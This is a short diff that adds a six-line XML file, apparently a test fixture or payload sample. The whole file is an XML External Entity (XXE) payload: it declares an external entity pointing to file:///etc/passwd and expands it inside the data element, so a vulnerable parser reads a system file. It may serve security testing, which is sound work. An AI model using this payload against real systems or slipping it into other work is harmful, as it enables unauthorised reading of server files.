@@ -1,0 +1,6 @@
+ <?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE data [
+<!ELEMENT data (#PCDATA)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
